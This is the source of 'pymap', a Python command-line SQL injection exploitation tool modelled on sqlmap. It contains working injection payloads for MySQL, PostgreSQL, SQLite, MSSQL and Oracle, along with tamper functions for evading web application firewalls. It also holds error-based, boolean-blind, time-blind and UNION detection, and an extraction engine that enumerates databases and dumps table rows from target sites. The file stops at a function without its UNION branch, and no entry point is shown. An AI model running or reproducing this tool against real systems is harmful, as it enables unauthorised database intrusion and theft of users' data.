#!/usr/bin/env python3
"""
pymap — a sqlmap-style command-line SQL injection exploitation tool.

Five-layer architecture:
  L1 HTTP client        - requests session, retries, latency capture, raw param control
  L2 Payload generator - context templates (numeric / single-quote / LIKE), DBMS-aware fragments
  L3 Detection logic    - error-based (E), boolean-blind (B), time-blind (T), UNION (U)
                           with positive+negative controls, majority voting
  L4 Extraction engine  - UNION fast-path, error-based chunks, boolean/time binary-search
                           per character, resumable per-value state cache
  L5 Reporting          - JSONL evidence log, session state, CSV dumps, reproducible PoC

Techniques: E (error-based), B (boolean-blind), T (time-blind), U (UNION query)
DBMS support: MySQL/MariaDB, PostgreSQL, SQLite, MSSQL (core), Oracle (fingerprint)

Usage examples:
  python3 pymap.py -u "http://target/page?id=1" --batch
  python3 pymap.py -u "http://target/page?id=1" --dbs
  python3 pymap.py -u "http://target/page?id=1" -D mydb --tables
  python3 pymap.py -u "http://target/page?id=1" -D mydb -T users --dump
  python3 pymap.py -u "http://target/page" --data "user=a&pass=b" --technique=BT
  python3 pymap.py -u "http://target/page?id=1" --tamper=space2comment,randomcase
  python3 pymap.py -u "http://target/page?id=1" --sql-query "SELECT version()"
"""

import argparse
import csv
import difflib
import json
import os
import random
import re
import sys
import time
import urllib.parse
from dataclasses import dataclass, field
from datetime import datetime, timezone

try:
    import requests
except ImportError:
    sys.exit("[!] requests library required: pip install requests")

VERSION = "pymap 1.1.0"
BANNER = r"""
    ____       __  ____
   / __ \___  / /_/ __ \___  _________  _____
  / /_/ / _ \/ __/ / / / _ \/ ___/ __ \/ ___/
 / ____/  __/ /_/ /_/ /  __/ /  / /_/ (__  )
/_/    \___/\__/_____/\___/_/   \____/____/  %-8s
""" % VERSION + "        sqlmap-style SQL injection detection & exploitation\n"

# ---------------------------------------------------------------- logging
VERBOSE = 1
_EVIDENCE = []          # (L5) JSONL evidence rows


def log(level, msg):
    if level <= VERBOSE:
        print(msg, flush=True)


def evidence(row):
    ts = datetime.now(timezone.utc).isoformat()
    _EVIDENCE.append({"ts": ts, **row})


# ---------------------------------------------------------------- L1: HTTP client
@dataclass
class HttpResult:
    status: int
    body: str
    headers: dict
    latency: float
    url: str
    method: str
    payload_param: str = ""
    payload_value: str = ""
    technique: str = ""


class HttpClient:
    """L1 - raw-control HTTP client. Params are encoded by us so injected
    payloads survive transport exactly."""

    def __init__(self, opts):
        self.opts = opts
        self.sess = requests.Session()
        self.sess.verify = not getattr(opts, "insecure", False)
        if getattr(opts, "proxy", None):
            self.sess.proxies = {"http": opts.proxy, "https": opts.proxy}
        self.ua = getattr(opts, "user_agent", None) or "pymap/1.1"
        self.req_count = 0

    @staticmethod
    def parse_qs(qs):
        """Parse query string preserving order and duplicates."""
        pairs = []
        for part in (qs or "").split("&"):
            if not part:
                continue
            if "=" in part:
                k, v = part.split("=", 1)
            else:
                k, v = part, ""
            pairs.append([urllib.parse.unquote_plus(k), urllib.parse.unquote_plus(v)])
        return pairs

    @staticmethod
    def encode_qs(pairs):
        return "&".join(
            urllib.parse.quote_plus(k, safe="") + "=" + urllib.parse.quote_plus(v, safe="")
            for k, v in pairs
        )

    def request(self, method, url, url_pairs, data_pairs, cookie_str, extra_headers,
               inject: tuple = None, tag=""):
        """inject = (location, name, payload_value) where location in url|data|cookie"""
        loc, pname, pval = inject if inject else (None, None, None)

        pairs_url = [list(p) for p in url_pairs]
        pairs_data = [list(p) for p in data_pairs]
        cookie = cookie_str or ""

        if loc == "url":
            for p in pairs_url:
                if p[0] == pname:
                    p[1] = pval
        elif loc == "data":
            for p in pairs_data:
                if p[0] == pname:
                    p[1] = pval
        elif loc == "cookie":
            parts = []
            for kv in (cookie_str or "").split(";"):
                kv = kv.strip()
                if not kv:
                    continue
                if "=" in kv:
                    k, v = kv.split("=", 1)
                    parts.append((k.strip(), v.strip()))
                else:
                    parts.append((kv, ""))
            hit = False
            rebuilt = []
            for k, v in parts:
                if k == pname:
                    rebuilt.append(f"{k}={pval}")
                    hit = True
                else:
                    rebuilt.append(f"{k}={v}")
            if not hit:
                rebuilt.append(f"{pname}={pval}")
            cookie = "; ".join(rebuilt)

        final_url = url
        if pairs_url:
            final_url = url + "?" + self.encode_qs(pairs_url)
        body = self.encode_qs(pairs_data) if pairs_data else None

        headers = {"User-Agent": self.ua, "Accept": "*/*"}
        if body is not None:
            headers["Content-Type"] = "application/x-www-form-urlencoded"
        if cookie:
            headers["Cookie"] = cookie
        headers.update(extra_headers or {})

        retries = getattr(self.opts, "retries", 2)
        timeout = getattr(self.opts, "timeout", 30)
        for attempt in range(retries + 1):
            t0 = time.monotonic()
            try:
                if method.upper() == "GET":
                    r = self.sess.get(final_url, headers=headers, timeout=timeout)
                else:
                    r = self.sess.request(method.upper(), final_url, headers=headers,
                                          data=body, timeout=timeout)
                latency = time.monotonic() - t0
                self.req_count += 1
                res = HttpResult(r.status_code, r.text, dict(r.headers), latency,
                                final_url, method.upper(), pname or "", pval or "", tag)
                evidence({"kind": "http", "tag": tag, "method": method, "url": final_url,
                          "body_len": len(r.text), "status": r.status_code,
                          "latency": round(latency, 3), "param": pname, "value": pval})
                delay = getattr(self.opts, "delay", 0)
                if delay:
                    time.sleep(delay + random.uniform(0, delay * 0.2))
                return res
            except requests.RequestException as e:
                log(3, f"    [-] request error ({attempt+1}): {e}")
                time.sleep(1 + attempt)
        return HttpResult(0, "", {}, timeout, final_url, method.upper(),
                          pname or "", pval or "", tag)


# ---------------------------------------------------------------- similarity helpers
def _norm(s: str) -> str:
    return re.sub(r"\s+", " ", s or "").strip()


def similar(a: str, b: str) -> bool:
    a, b = _norm(a), _norm(b)
    if a == b:
        return True
    if abs(len(a) - len(b)) > max(24, 0.03 * max(len(a), len(b))):
        return False
    return difflib.SequenceMatcher(None, a, b).quick_ratio() > 0.98


def differs(a: str, b: str) -> bool:
    return not similar(a, b)


# ---------------------------------------------------------------- L2: payload / context grammar
MARK_OPEN = "zqX7Kp"
MARK_CLOSE = "Kp7Xqz"

ERROR_SIGNATURES = {
    "MySQL": [
        r"SQL syntax.*?MySQL", r"Warning.*?\Wmysqli?_", r"MySQLSyntaxErrorException",
        r"valid MySQL result", r"\bMySqlClient\.", r"Doctrine\\DBAL",
        r"MariaDB.*(query|syntax)", r"You have an error in your SQL syntax",
    ],
    "PostgreSQL": [
        r"PostgreSQL.*ERROR", r"Warning.*?\Wpg_", r"valid PostgreSQL result",
        r"Npgsql\.", r"PG::SyntaxError", r"psycopg2\.",
    ],
    "SQLite": [
        r"SQLite/JDBCDriver", r"SQLiteException", r"System\.Data\.SQLite\.SQLiteException",
        r"Warning.*?\Wsqlite_", r"SQLite error", r"\[SQLITE_\d+\]", r"unrecognized token",
        r"SQLITE_ERROR",
    ],
    "MSSQL": [
        r"Driver.*? SQL[\s_-]*Server", r"OLE DB.*? SQL Server", r"SQL Server.*?Driver",
        r"Warning.*?\W(mssql|sqlsrv)_", r"Syntax error.*?SQL Server",
        r"Unclosed quotation mark after the character string",
        r"\[Microsoft\]\[SQL Server\]",
    ],
    "Oracle": [r"\bORA-\d{5}", r"Oracle error", r"Warning.*?\W(oci|ora)_"],
}


def fingerprint_error(body: str):
    for dbms, sigs in ERROR_SIGNATURES.items():
        for sig in sigs:
            if re.search(sig, body, re.I):
                return dbms
    return None


class Context:
    """Injection context grammar: how to splice SQL fragments into a parameter value."""
    def __init__(self, name, and_tmpl, union_tmpl=None, order_tmpl=None, inverted=False):
        self.name = name
        self.and_tmpl = and_tmpl          # {orig} {cond}
        self.union_tmpl = union_tmpl or and_tmpl.replace("({cond})", "{UNIONFRAG}")
        self.order_tmpl = order_tmpl or and_tmpl.replace("({cond})", "{ORDERFRAG}")
        self.inverted = inverted          # OR-based: true differs from baseline

    def wrap_and(self, orig, cond):
        return self.and_tmpl.format(orig=orig, cond=cond)

    def wrap_union(self, orig, sel):
        return self.union_tmpl.format(orig=orig, sel=sel)

    def wrap_order(self, orig, n):
        return self.order_tmpl.format(orig=orig, n=n)

    def time_tmpl(self):
        return self.and_tmpl.replace("({cond})", "{TIMEFRAG}")

    def wrap_time(self, orig, frag):
        return self.time_tmpl().format(orig=orig, TIMEFRAG=frag)


CONTEXTS = [
    Context("numeric", "{orig} AND ({cond})",
            "{orig} UNION ALL SELECT {sel}", "{orig} ORDER BY {n}"),
    Context("numeric_comment", "{orig} AND ({cond})-- -",
            "{orig} UNION ALL SELECT {sel}-- -", "{orig} ORDER BY {n}-- -"),
    Context("singleq", "{orig}' AND ({cond}) AND 'x'='x",
            "{orig}' UNION ALL SELECT {sel}-- -", "{orig}' ORDER BY {n}-- -"),
    Context("singleq_comment", "{orig}' AND ({cond})-- -",
            "{orig}' UNION ALL SELECT {sel}-- -", "{orig}' ORDER BY {n}-- -"),
    Context("singleq_doublequote", '{orig}" AND ({cond}) AND "x"="x',
            '{orig}" UNION ALL SELECT {sel}-- -', '{orig}" ORDER BY {n}-- -'),
    Context("like_singleq", "{orig}%' AND ({cond}) AND '%'='",
            "{orig}%' UNION ALL SELECT {sel}-- -", "{orig}%' ORDER BY {n}-- -"),
]

OR_CONTEXTS = [
    Context("numeric_or", "{orig} OR ({cond})", inverted=True),
    Context("singleq_or", "{orig}' OR ({cond}) AND 'x'='x", inverted=True),
]

# Tamper transforms (L2 / WAF bypass)
def tamper_space2comment(p):      return p.replace(" ", "/**/")
def tamper_space2plus(p):         return p.replace(" ", "+")
def tamper_space2tab(p):          return p.replace(" ", "\t")
def tamper_randomcase(p):
    return "".join(c.upper() if random.random() < 0.5 else c.lower() for c in p)
def tamper_between(p):
    return re.sub(r"(\S+)>(\d+)", r"\1 NOT BETWEEN 0 AND \2", p)
def tamper_charencode(p):          return urllib.parse.quote(p, safe="")
def tamper_equaltolike(p):        return p.replace("=", " LIKE ", 1)

TAMPERS = {
    "space2comment": tamper_space2comment,
    "space2plus": tamper_space2plus,
    "space2tab": tamper_space2tab,
    "randomcase": tamper_randomcase,
    "between": tamper_between,
    "charencode": tamper_charencode,
    "equaltolike": tamper_equaltolike,
}


def apply_tampers(payload, names):
    for n in (names or []):
        fn = TAMPERS.get(n)
        if fn:
            payload = fn(payload)
    return payload


# ---------------------------------------------------------------- DBMS dialect helpers
class Dialect:
    """Per-DBMS SQL fragments used by detection and extraction."""
    def __init__(self, dbms):
        self.dbms = dbms

    # ---- construction helpers
    def marker(self, query):
        q = f"({query})"
        if self.dbms == "MySQL":
            return f"CONCAT('{MARK_OPEN}',{q},'{MARK_CLOSE}')"
        if self.dbms == "MSSQL":
            return f"'{MARK_OPEN}'+CAST({query} AS VARCHAR(8000))+'{MARK_CLOSE}'"
        return f"'{MARK_OPEN}'||{q}||'{MARK_CLOSE}'"       # PG / SQLite / Oracle

    def error_oracle(self, query):
        """SQL fragment that errors with the query result embedded in the message."""
        q = f"({query})"
        if self.dbms == "MySQL":
            return f"EXTRACTVALUE(1,CONCAT(0x7e,{q}))"
        if self.dbms == "PostgreSQL":
            return f"CAST({query} AS int)"
        if self.dbms == "MSSQL":
            return f"CONVERT(int,{query})"
        return None

    def ascii_gt(self, query, pos, mid):
        q = f"({query})"
        if self.dbms == "MySQL":
            return f"ORD(SUBSTR({q},{pos},1))>{mid}"
        if self.dbms == "SQLite":
            return f"unicode(substr({q},{pos},1))>{mid}"
        return f"ASCII(SUBSTR({q},{pos},1))>{mid}"          # PG / MSSQL / Oracle

    def length_gt(self, query, mid):
        fn = "LEN" if self.dbms == "MSSQL" else "LENGTH"
        return f"{fn}(({query}))>{mid}"

    def time_frag(self, cond, secs):
        """Boolean condition wrapped into a timing primitive (for AND contexts)."""
        if self.dbms == "MySQL":
            return f"IF(({cond}),SLEEP({secs}),0)"
        if self.dbms == "PostgreSQL":
            return f"(CASE WHEN ({cond}) THEN (SELECT 1 FROM pg_sleep({secs})) ELSE 1 END)"
        if self.dbms == "SQLite":
            return (f"(SELECT CASE WHEN ({cond}) THEN (WITH RECURSIVE r(i) AS "
                    f"(VALUES(0) UNION ALL SELECT i+1 FROM r LIMIT 30000000) "
                    f"SELECT count(*) FROM r) ELSE 1 END)")
        return f"IF({cond},1,0)"

    def stacked_time(self, orig, cond, secs):
        """Full payload using statement stacking (MSSQL WAITFOR)."""
        if self.dbms == "MSSQL":
            return f"{orig};IF({cond}) WAITFOR DELAY '0:0:{secs}'-- -"
        return None

    # ---- enumeration queries (each returns ONE scalar)
    def q_banner(self):
        return {
            "MySQL": "SELECT version()",
            "PostgreSQL": "SELECT version()",
            "SQLite": "SELECT sqlite_version()",
            "MSSQL": "SELECT @@version",
            "Oracle": "SELECT banner FROM v$version WHERE ROWNUM=1",
        }[self.dbms]

    def q_current_db(self):
        return {
            "MySQL": "SELECT database()",
            "PostgreSQL": "SELECT current_database()",
            "SQLite": "SELECT 'sqlite-file'",
            "MSSQL": "SELECT DB_NAME()",
            "Oracle": "SELECT SYS_CONTEXT('USERENV','DB_NAME') FROM DUAL",
        }[self.dbms]

    def q_current_user(self):
        return {
            "MySQL": "SELECT current_user",
            "PostgreSQL": "SELECT current_user",
            "SQLite": "SELECT 'n/a'",
            "MSSQL": "SELECT SYSTEM_USER",
            "Oracle": "SELECT USER FROM DUAL",
        }[self.dbms]

    def q_dbs(self):
        return {
            "MySQL": "SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata",
            "PostgreSQL": "SELECT string_agg(datname, ',') FROM pg_database",
            "SQLite": "SELECT 'sqlite-file'",
            "MSSQL": "SELECT name FROM master..sysdatabases",
            "Oracle": "SELECT username FROM all_users",
        }[self.dbms]

    def q_tables(self, db):
        return {
            "MySQL": f"SELECT GROUP_CONCAT(table_name) FROM information_schema.tables "
                     f"WHERE table_schema='{db}'",
            "PostgreSQL": f"SELECT string_agg(tablename, ',') FROM pg_tables "
                           f"WHERE schemaname='{db}'",
            "SQLite": "SELECT group_concat(name) FROM sqlite_master WHERE type='table'",
            "MSSQL": f"SELECT name FROM {db}..sysobjects WHERE xtype='U'",
            "Oracle": f"SELECT table_name FROM all_tables WHERE owner='{db}'",
        }[self.dbms]

    def q_columns(self, db, table):
        return {
            "MySQL": f"SELECT GROUP_CONCAT(column_name) FROM information_schema.columns "
                     f"WHERE table_schema='{db}' AND table_name='{table}'",
            "PostgreSQL": f"SELECT string_agg(column_name, ',') FROM information_schema.columns "
                          f"WHERE table_schema='{db}' AND table_name='{table}'",
            "SQLite": f"SELECT group_concat(name) FROM pragma_table_info('{table}')",
            "MSSQL": f"SELECT name FROM {db}..syscolumns WHERE id=OBJECT_ID('{db}.dbo.{table}')",
            "Oracle": f"SELECT column_name FROM all_tab_columns WHERE owner='{db}' "
                      f"AND table_name='{table}'",
        }[self.dbms]

    def q_count(self, db, table):
        if self.dbms == "SQLite":
            return f"SELECT COUNT(*) FROM {table}"
        if db:
            return f"SELECT COUNT(*) FROM {db}.{table}"
        return f"SELECT COUNT(*) FROM {table}"

    def q_row(self, db, table, cols, offset):
        if self.dbms == "MySQL":
            col_list = ",".join(cols)
            return (f"SELECT CONCAT_WS(0x3a,{col_list}) FROM {db}.{table} "
                    f"LIMIT 1 OFFSET {offset}")
        if self.dbms == "SQLite":
            nullsafe = "||': '||".join(f"COALESCE({c},'NULL')" for c in cols)
            return f"SELECT {nullsafe} FROM {table} LIMIT 1 OFFSET {offset}"
        if self.dbms == "PostgreSQL":
            nullsafe = "||': '||".join(f"COALESCE({c}::text,'NULL')" for c in cols)
            return f"SELECT {nullsafe} FROM {db}.{table} LIMIT 1 OFFSET {offset}"
        if self.dbms == "MSSQL":
            nullsafe = "+': '+".join(f"ISNULL(CAST({c} AS VARCHAR(500)),'NULL')" for c in cols)
            return (f"SELECT TOP 1 {nullsafe} FROM {db}.{table} "
                    f"ORDER BY (SELECT NULL) OFFSET {offset} ROWS")
        # Oracle
        nullsafe = "||': '||".join(f"NVL(TO_CHAR({c}),'NULL')" for c in cols)
        return (f"SELECT {nullsafe} FROM (SELECT t.* FROM {db}.{table} t "
                f"OFFSET {offset} ROWS FETCH NEXT 1 ROWS ONLY)")


SYS_DBS = {"information_schema", "mysql", "performance_schema", "sys", "pg_catalog",
           "pg_toast", "master", "tempdb", "model", "msdb", "northwind", "pubs"}


# ---------------------------------------------------------------- L3/L4: injection objects
@dataclass
class Injection:
    param: str                 # parameter name
    location: str              # url | data | cookie | header
    context: Context           # working context grammar
    techniques: dict = field(default_factory=dict)   # technique -> details
    dbms: str = None
    union_cols: int = 0
    union_pos: int = 0          # 1-based column position that echoes data
    marker_style: str = None    # CONCAT | PIPES | PLUS
    _orig: str = "1"


class Extractor:
    """L4 - turns a confirmed injection into a scalar-extraction oracle."""

    def __init__(self, client, target, injection, opts, dialect, state):
        self.c = client
        self.t = target
        self.inj = injection
        self.opts = opts
        self.d = dialect
        self.state = state            # {"cache": {query: value}}
        self.stats = {"requests": 0, "chars": 0}
        self._orig = injection._orig

    # ---- raw request builders -------------------------------------------
    def _send(self, value, tag):
        payload = self._tamper(value)
        return self.c.request(
            self.t.method, self.t.url, self.t.url_pairs, self.t.data_pairs,
            self.t.cookie_str, self.t.headers,
            inject=(self.inj.location, self.inj.param, payload), tag=tag)

    def _tamper(self, payload):
        return apply_tampers(payload, getattr(self.opts, "tamper", None) or [])

    # ---- boolean oracle ---------------------------------------------------
    def _bool_probe(self, cond) -> bool:
        raw = self.inj.context.wrap_and(self._orig, cond)
        r = self._send(raw, f"B:{cond[:40]}")
        self.stats["requests"] += 1
        base = self.t.baseline
        if self.inj.context.inverted:
            return differs(r.body, base.body)
        return similar(r.body, base.body)

    # ---- time oracle ----------------------------------------------------
    def _time_probe(self, cond) -> bool:
        stacked = self.d.stacked_time(self._orig, cond, self.opts.time_sec)
        if stacked:
            raw = stacked
        else:
            frag = self.d.time_frag(cond, self.opts.time_sec)
            raw = self.inj.context.wrap_time(self._orig, frag)
        r = self._send(raw, f"T:{cond[:40]}")
        self.stats["requests"] += 1
        return r.latency >= (self.opts.time_sec - 1)

    # ---- UNION oracle ----------------------------------------------------
    def _union_probe(self, query) -> str:
        mk = self.d.marker(query)
        sel = ["NULL"] * self.inj.union_cols
        sel[self.inj.union_pos - 1] = mk
        raw = self.inj.context.wrap_union(self._orig, ", ".join(sel))
        r = self._send(raw, f"U:{query[:40]}")
        self.stats["requests"] += 1
        m = re.search(re.escape(MARK_OPEN) + r"(.*?)" + re.escape(MARK_CLOSE), r.body, re.S)
        return m.group(1) if m else None

    # ---- error oracle ----------------------------------------------------
    def _error_probe(self, query) -> str:
        frag = self.d.error_oracle(query)
        if frag is None:
            return None
        raw = self.inj.context.wrap_and(self._orig, frag)
        r = self._send(raw, f"E:{query[:40]}")
        self.stats["requests"] += 1
        if self.d.dbms == "MySQL":
            m = re.search(re.escape("XPATH syntax error:") + r".*?'([^']*)'",
                         r.body, re.S)
            if m:
                return m.group(1).lstrip("~")
        m = re.search(re.escape(MARK_OPEN) + r"(.*?)" + re.escape(MARK_CLOSE), r.body, re.S)
        return m.group(1) if m else None

    # ---- public scalar extraction (auto technique selection) --------------
    def extract(self, query) -> str:
        query = query.strip().rstrip(";")
        if query in self.state:
            log(3, f"      [cache] {query[:60]} -> {self.state[query][:40]}")
            return self.state[query]

        for tech in self.opts.technique:
            if tech == "U" and "U" in self.inj.techniques:
                val = self._union_probe(query)
                if val is not None:
                    return self._save(query, val)
            if tech == "E" and "E" in self.inj.techniques:
                val = self._error_extract(query)
                if val is not None:
                    return self._save(query, val)
            if tech in ("B", "T") and tech in self.inj.techniques:
                probe = self._bool_probe if tech == "B" else self._time_probe
                val = self._bisect(query, probe)
                if val is not None:
                    return self._save(query, val)
        return None

    def _error_extract(self, query):
        """Error-based extraction in 30-char chunks (EXTRACTVALUE limit ~32)."""
        out = ""
        for start in range(1, 2000, 30):
            chunk_q = (f"SELECT SUBSTR(({query}),{start},30)" if self.d.dbms == "MSSQL"
                      else f"SELECT SUBSTR(({query}),{start},30)")
            frag = self.d.error_oracle(chunk_q)
            if frag is None:
                return None
            raw = self.inj.context.wrap_and(self._orig, frag)
            r = self._send(raw, f"E:{chunk_q[:40]}")
            self.stats["requests"] += 1
            if self.d.dbms == "MySQL":
                m = re.search(r"XPATH syntax error:\s*'([^']*)'", r.body, re.S)
                val = m.group(1).lstrip("~") if m else None
            elif self.d.dbms == "PostgreSQL":
                m = re.search(r'invalid input syntax for type integer:\s*"([^"]*)"',
                              r.body, re.S)
                val = m.group(1) if m else None
            else:
                m = re.search(r'converting the \w+ value to a column of data type int[^:]*:\s*"([^"]*)"',
                              r.body, re.S)
                val = m.group(1) if m else None
            if not val:
                break
            out += val
            if len(val) < 30:
                break
        return out or None

    # ---- binary search per character (L4 core loop) ----------------------
    def _bisect(self, query, probe):
        # 1. length via binary search
        lo, hi = 0, 4096
        while lo < hi:
            mid = (lo + hi) // 2
            if probe(self.d.length_gt(query, mid)):
                lo = mid + 1
            else:
                hi = mid
        length = lo
        if length == 0:
            return ""
        if length >= 4096:
            log(2, f"      [!] suspicious length {length} for {query[:50]}, capping at 1024")
            length = 1024

        # 2. chars via binary search over printable ASCII
        out = []
        for pos in range(1, length + 1):
            lo, hi = 1, 127
            while lo < hi:
                mid = (lo + hi) // 2
                if probe(self.d.ascii_gt(query, pos, mid)):
                    lo = mid + 1
                else:
                    hi = mid
            ch = chr(lo) if 1 <= lo < 127 else ""
            out.append(ch)
            self.stats["chars"] += 1
            if len(out) % 20 == 0:
                log(3, f"      [{self.stats['requests']} reqs] {len(out)}/{length}: "
                       f"{''.join(out)[-24:]!r}")
        return "".join(out)

    def _save(self, query, value):
        self.state[query] = value
        self.state.save()
        return value


# ---------------------------------------------------------------- target model
@dataclass
class Target:
    url: str
    method: str
    url_pairs: list
    data_pairs: list
    cookie_str: str
    headers: dict
    baseline: HttpResult = None
    marked: list = field(default_factory=list)

    def candidates(self, level, marked=None):
        """Return list of (location, name, value) testable parameters."""
        if marked:
            return list(marked)
        out = []
        if level >= 1:
            for k, v in self.url_pairs:
                out.append(("url", k, v))
            for k, v in self.data_pairs:
                out.append(("data", k, v))
        if level >= 2 and self.cookie_str:
            for kv in self.cookie_str.split(";"):
                kv = kv.strip()
                if "=" in kv:
                    k, v = kv.split("=", 1)
                    out.append(("cookie", k.strip(), v.strip()))
        return out


class StateStore(dict):
    """Persistent extraction cache: {query: value} so re-runs resume for free."""
    def __init__(self, path):
        super().__init__()
        self.path = path
        if os.path.exists(path):
            try:
                with open(path) as f:
                    self.update(json.load(f))
            except Exception:
                pass

    def save(self):
        os.makedirs(os.path.dirname(self.path), exist_ok=True)
        with open(self.path, "w") as f:
            json.dump(self, f, indent=1)


# ---------------------------------------------------------------- L3: detection engine
class Detector:
    def __init__(self, client, target, opts):
        self.c = client
        self.t = target
        self.opts = opts

    def send(self, location, name, value, tag):
        return self.c.request(self.t.method, self.t.url, self.t.url_pairs,
                             self.t.data_pairs, self.t.cookie_str, self.t.headers,
                             inject=(location, name, value), tag=tag)

    # -------- canary + error fingerprint
    def canary(self, location, name, orig):
        for probe in ["'", '"', ")"]:
            r = self.send(location, name, orig + probe, f"canary:{probe[:8]}")
            dbms = fingerprint_error(r.body)
            if dbms:
                log(2, f"    [+] error fingerprint: {dbms} (probe {probe!r})")
                return dbms
        return None

    # -------- boolean detection with controls (3x majority)
    def detect_boolean(self, location, name, orig, ctx_list, inverted_ok=False):
        base = self.t.baseline
        for ctx in ctx_list:
            if ctx.inverted and not inverted_ok:
                continue
            votes = []
            for _ in range(3):
                rt = self.send(location, name, ctx.wrap_and(orig, "1=1"), "B:true")
                rf = self.send(location, name, ctx.wrap_and(orig, "1=2"), "B:false")
                if ctx.inverted:
                    ok = differs(rt.body, base.body) and similar(rf.body, base.body)
                else:
                    ok = similar(rt.body, base.body) and differs(rf.body, base.body)
                votes.append(ok)
            if sum(votes) >= 2:
                log(2, f"    [+] boolean-blind confirmed via context '{ctx.name}' "
                       f"(votes {votes})")
                inj = Injection(param=name, location=location, context=ctx,
                               _orig=orig)
                inj.techniques["B"] = {"context": ctx.name, "votes": votes}
                return inj
        return None

    # -------- UNION detection: column count via ORDER BY, then marker echo
    def detect_union(self, location, name, orig, ctx_list, dbms_hint=None):
        base = self.t.baseline
        for ctx in ctx_list:
            count, last_ok = None, 0
            for n in range(1, 33):
                r = self.send(location, name, ctx.wrap_order(orig, n), f"U:orderby{n}")
                ok = similar(r.body, base.body) and not fingerprint_error(r.body)
                if ok:
                    last_ok = n
                else:
                    count = n - 1
                    break
            if not count or count < 1 or last_ok != count:
                continue
            styles = ({"MySQL": ["CONCAT"], "PostgreSQL": ["PIPES"], "SQLite": ["PIPES"],
                       "MSSQL": ["PLUS"], "Oracle": ["PIPES"]}.get(dbms_hint)
                      if dbms_hint else ["CONCAT", "PIPES", "PLUS"]) or ["CONCAT"]
            for style in styles:
                dummy = (f"CONCAT('{MARK_OPEN}','pymap','{MARK_CLOSE}')" if style == "CONCAT"
                         else f"'{MARK_OPEN}'+'pymap'+'{MARK_CLOSE}'" if style == "PLUS"
                         else f"'{MARK_OPEN}'||'pymap'||'{MARK_CLOSE}'")
                for pos in range(1, count + 1):
                    sel = ["NULL"] * count
                    sel[pos - 1] = dummy
                    payload = ctx.wrap_union(orig, ", ".join(sel))
                    r = self.send(location, name, payload, f"U:echo{style}{pos}")
                    if MARK_OPEN in r.body:
                        log(2, f"    [+] UNION query confirmed: {count} columns, "
                               f"echo at pos {pos}, style {style}")
                        inj = Injection(param=name, location=location, context=ctx,
                                       _orig=orig)
                        inj.techniques["U"] = {"columns": count, "echo_pos": pos}
                        inj.union_cols = count
                        inj.union_pos = pos
                        inj.marker_style = style
                        return inj
        return None

    # -------- time-based detection (true sleeps, false doesn't)
    def detect_time(self, location, name, orig, ctx_list, dbms_hint=None):
        for ctx in ctx_list:
            for dbms in ([dbms_hint] if dbms_hint else
                         ["MySQL", "PostgreSQL", "MSSQL", "SQLite"]):
                d = Dialect(dbms)
                frag_t = d.time_frag("1=1", self.opts.time_sec)
                frag_f = d.time_frag("1=2", self.opts.time_sec)
                stacked_t = d.stacked_time(orig, "1=1", self.opts.time_sec)
                stacked_f = d.stacked_time(orig, "1=2", self.opts.time_sec)
                if stacked_t:
                    pt, pf = stacked_t, stacked_f
                else:
                    pt = ctx.wrap_time(orig, frag_t)
                    pf = ctx.wrap_time(orig, frag_f)
                votes = []
                for _ in range(2):
                    rt = self.send(location, name, pt, "T:true")
                    rf = self.send(location, name, pf, "T:false")
                    votes.append(rt.latency >= (self.opts.time_sec - 1)
                                and rf.latency < (self.opts.time_sec - 1))
                if any(votes):
                    log(2, f"    [+] time-blind confirmed via context '{ctx.name}' "
                           f"[{dbms}] (votes {votes})")
                    inj = Injection(param=name, location=location, context=ctx,
                                   _orig=orig)
                    inj.techniques["T"] = {"context": ctx.name, "dbms": dbms}
                    inj.dbms = dbms
                    return inj
        return None

    # -------- error-based detection
    def detect_error(self, location, name, orig, ctx_list, dbms_hint=None):
        for ctx in ctx_list:
            for dbms in ([dbms_hint] if dbms_hint else ["MySQL", "PostgreSQL", "MSSQL"]):
                d = Dialect(dbms)
                frag = d.error_oracle("SELECT 'pymaperr'")
                if frag is None:
                    continue
                payload = ctx.wrap_and(orig, frag)
                r = self.send(location, name, payload, f"E:{dbms}")
                if "pymaperr" in r.body:
                    log(2, f"    [+] error-based confirmed [{dbms}] via '{ctx.name}'")
                    inj = Injection(param=name, location=location, context=ctx,
                                    _orig=orig)
                    inj.techniques["E"] = {"context": ctx.name, "dbms": dbms}
                    inj.dbms = dbms
                    return inj
        return None

    # -------- full pipeline per parameter
    def run(self, location, name, orig, techniques, dbms_hint=None, risk=1):
        log(1, f"[*] testing parameter '{name}' ({location}) = {orig!r}")
        ctx_list = list(CONTEXTS)
        if risk >= 2:
            ctx_list = OR_CONTEXTS + ctx_list

        hint = dbms_hint or (self.canary(location, name, orig)
                             if "E" in techniques or True else None)

        if "E" in techniques and hint in ("MySQL", "PostgreSQL", "MSSQL"):
            inj = self.detect_error(location, name, orig, ctx_list, hint)
            if inj:
                return inj, hint
        if "U" in techniques:
            inj = self.detect_union(location, name, orig, ctx_list, hint)
            if inj:
                if hint is None:
                    hint = {"CONCAT": "MySQL", "PIPES": None, "PLUS": "MSSQL"}.get(
                        inj.marker_style)
                return inj, hint
        if "B" in techniques:
            inj = self.detect_boolean(location, name, orig, ctx_list,
                                      inverted_ok=(risk >= 2))
            if inj:
                return inj, hint
        if "T" in techniques:
            inj = self.detect_time(location, name, orig, ctx_list, hint)
            if inj:
                return inj, inj.dbms if hint is None else hint
        return None, hint


# ---------------------------------------------------------------- fingerprint via oracle
def fingerprint_dbms(extractor, hint):
    """Confirm the DBMS with behavioral probes, using the oracle that matches the
    confirmed technique (boolean diff / timing primitive / UNION banner)."""
    inj = extractor.inj
    probes = [
        ("SQLite", "SQLITE_VERSION() IS NOT NULL"),
        ("PostgreSQL", "VERSION() LIKE '%Postgre%'"),
        ("MySQL", "CONNECTION_ID() IS NOT NULL"),
        ("MSSQL", "HOST_NAME() IS NOT NULL"),
    ]

    if "B" in inj.techniques:
        # boolean oracle: true condition leaves the page like baseline
        for dbms, cond in probes:
            try:
                if extractor._bool_probe(cond):
                    return dbms
            except Exception:
                continue
        return hint or "MySQL"

    if "T" in inj.techniques:
        # timing oracle: only the target DBMS parses+sleeps its own primitive
        order = [hint] if hint else []
        order += [d for d in ("MySQL", "PostgreSQL", "MSSQL", "SQLite") if d != hint]
        for dbms in order:
            d = Dialect(dbms)
            frag = d.time_frag("1=1", extractor.opts.time_sec)
            stacked = d.stacked_time(extractor._orig, "1=1", extractor.opts.time_sec)
            raw = stacked or inj.context.wrap_time(extractor._orig, frag)
            r = extractor._send(raw, f"fp:{dbms}")
            if r.latency >= (extractor.opts.time_sec - 1):
                return dbms
        return hint or "MySQL"

